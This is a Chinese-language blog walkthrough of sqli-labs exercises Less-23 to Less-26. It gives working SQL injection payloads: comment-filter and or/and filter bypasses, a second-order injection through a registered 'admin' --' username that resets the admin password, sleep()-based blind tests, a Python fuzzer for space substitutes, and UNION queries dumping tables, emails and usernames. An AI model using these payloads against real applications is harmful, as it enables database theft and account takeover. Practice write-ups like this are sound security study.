---
layout: post
title: SQL注入（十二）
desc: ""
keywords: ""
date: 2016-11-16 
categories: []
tags: []
---

<h2>Less-23</h2>

<h3>Fuzz</h3>

?id=1'#+ 不起作用

?id=1' 报错

怀疑可能过滤掉了注释符号，考虑用构造原本语句的方法绕过。

找到一个简单的判断方法，在加单引号以后加上%23和%24进行对比，发现%23这一URL编码没有出现#，说明被过滤了

<img src="http://oc42vgpoj.bkt.clouddn.com/Less23_fuzz1.png" />

<img src="http://oc42vgpoj.bkt.clouddn.com/Less23_fuzz2.png" />

<h3>Payload</h3>

<pre class="lang:default decode:true">?id=-1' union select 1,database(),user() or '1'='1</pre>

发现注释符号应该与后面被注释的内容隔开至少一个空格，否则注释不起作用。比如可以用+--+

<img src="http://oc42vgpoj.bkt.clouddn.com/Less23_limit.png" />

突然发现很奇怪，因为有一列总是显示不出来，后来想到是语句里面的 limit 0,1 没有办法被注释掉

这题还有其他解法吗？求教各位（group_concat???）

<h2>Less-24</h2>

简直有毒==

<h3>概述</h3>

是一个比较完整的登录界面，有用户注册、用户登录的功能，登陆后可以修改密码。

审计一下源码，发现对在注册页面对注册用户名、原密码、新密码、确认密码都有过滤，更改密码页面对原密码、新密码有过滤，于是只剩下用户名可以用。

<img src="http://oc42vgpoj.bkt.clouddn.com/Less24_php.png" />

注意这里的过滤并非上一题的替代，只是转义而已。于是数据将会被以原来的形式保存进数据库，不会有删改，只是转义后在调用的时候不会有原来的效果。

<h3>Payload</h3>

<ol>
<li>注册名为<code>admin' --</code>的用户（注意在两个短线后面有一个<strong>空格</strong>）</li>
<li>登录，更改密码</li>
</ol>

<img src="http://oc42vgpoj.bkt.clouddn.com/Less24_change.png" />

这里要复习一下之前讲过的更新数据的语句，语句是

<pre class="lang:default decode:true">UPDATE users SET PASSWORD='abc' where username='admin' and password='admin' ;</pre>

由于我们的用户名带有注释符号，于是就在更改时变成了

<pre class="lang:default decode:true">UPDATE users SET PASSWORD='abc' where username='admin' -- ' and password='admin' ;</pre>

成功改掉admin的密码

<img src="http://oc42vgpoj.bkt.clouddn.com/Less24_payload.png" />

<h2>Less-25 &amp; Less-25a</h2>

<h3>Fuzz</h3>

通过?id=1' or1的方法对比Less1和Less25发现他们的区别，过滤掉了or和and

<img src="http://oc42vgpoj.bkt.clouddn.com/Less25_fuzz1.png" />

<img src="http://oc42vgpoj.bkt.clouddn.com/Less25_fuzz2.png" />

如果大小写敏感的话可以通过大小写绕过，然鹅这里不敏感，所以可以用数学符号绕过，或者双写（这个给满分）

<h3>Payload</h3>

<ul>
<li>or:</li>
<li>||</li>
<li>oorr</li>
<li>and:</li>
<li>&amp;&amp; （URL编码为%26%26）</li>
<li>anandd</li>
</ul>

简直精彩

Less-25a只是换成了盲注，可以用以下方法判断

?id=1 %26%26 sleep(10)
?id=-1 || sleep(10)

挂起则说明这样能够起作用

##Less-26

又开始玩花了，这次过滤的更全了

<h3>Fuzz</h3>

?id=%231 // 判断过滤了注释
?id=%or1 // 判断过滤了or
?id=%and // 判断过滤了and
?id=/&#42;1 // 过滤了斜杠和反斜杠
?id=1' ' ' // 过滤了空格

<h3>Payload</h3>

搞一个脚本来判断哪些可能可以用

<pre class="lang:python decode:true"># -*- coding: utf-8 -*-
import requests

def changeToHex(num):
tmp = hex(num).replace("0x",'')
if len(tmp)&lt;2:
tmp = '0' + tmp
return "%"+tmp


for i in range(256):
i = changeToHex(i)
url = "http://192.168.137.129/sqli/Less-26/?id=1'" + i +"%26%26" + i + "'1'='1"
responce = requests.get(url)
if('Dumb') in responce.content:
print "%s works!" %i</pre>

结果

<pre class="lang:default decode:true">%09 works! // tab
%0a works! // linefeed
%0b works! // 不明（空格）
%0c works! // 不明（空格）
%0d works! // c return
%20 works! // space
%22 works! // 双引号
%23 works! //#
%27 works! //单引号
%2a works! //星号
%2d works! //减号
%2f works! //斜线
%5c works! //反斜线
%a0 works! //不明（空格）</pre>

<pre class="lang:tsql decode:true ">?id=0%27union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables
%a0where%a0table_schema='security'%26%26%a0%271%27=%271

?id=0%27%a0union%a0select%a01,group_concat(email_id),3%a0from%a0emails%a0union
%a0select(1),2,'3

（留坑待填）

?id=0' union select 1,email_id,3 from emails where 1 &amp;&amp; '1'='1 
?id=0' union select 1,username,3 from security.users where 1 &amp;&amp; '1</pre>

&nbsp;